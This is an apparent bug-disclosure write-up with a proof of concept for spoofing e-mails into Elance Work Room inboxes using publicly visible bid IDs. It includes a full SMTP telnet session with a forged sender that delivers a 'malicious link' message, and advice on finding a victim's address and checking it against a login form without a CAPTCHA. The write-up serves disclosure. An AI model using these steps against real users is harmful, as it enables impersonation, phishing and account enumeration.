Elance WR E-mail Spoofing & Impersonation (explanation and PoC)
==========

From Wikipedia:

> "Elance is a global online staffing platform where companies, organizations and individuals can hire independent freelance professionals and use online collaboration tools to manage teams and projects. Independent contractors create online profiles and portfolios, submit proposals for jobs, and collaborate and receive payment through the Elance website."

## The Work Room

The WR provides private messaging for both freelancers and contractors. Bid ID is used as database reference (this is important, the bid IDs are publicly available).
For each WR, Elance provides an unique email address with the following format, where XXXXXX refers to bid ID:

    EXXXXXX-WR@workroom.elance.com

## The bug

One of the first things I tried was to send a message from my personal e-mail address to a friend's WR address. An error about a message being filtered showed up at his WR and he was not able to see it.
Then I started playing with my SMTP server and fake headers worked surprisingly.

## Methodology

Look for a job, check the proposal list and focus on one of them. Write down its bid ID, located at the bottom, next to the pubdate.
An important detail is that you need to know the other's e-mail address. Googling should work ;-)
With the correct e-mail address and bid ID we could easily send a message like this:

    $ telnet 127.0.0.1 25
    Connected to 127.0.0.1.
    Escape character is '^]'.
    220 serveri ESMTP Exim Sun, 11 Aug 2013 17:50:10 +0000
    HELO server
    250 server Hello localhost [127.0.0.1]
    MAIL FROM: other@gmail.com
    250 OK
    RCPT TO: EXXXXXX-WR@workroom.elance.com
    250 Accepted
    DATA
    354 Enter message, ending with "." on a line by itself
    SUBJECT: Elance
    
    hello, check this malicious link: http://www.maliciouslink.com/
    
    250 OK

**Important detail about e-mail check:** Forms for user/password recovery have nice CAPTCHAs but the main login screen doesn't. So one can easily google a victim's e-mail address (most freelancers have personal pages, blogs and even their own domains with disclosed WHOIS information) and check if it's the one they use for Elance. Look at the source for examples.
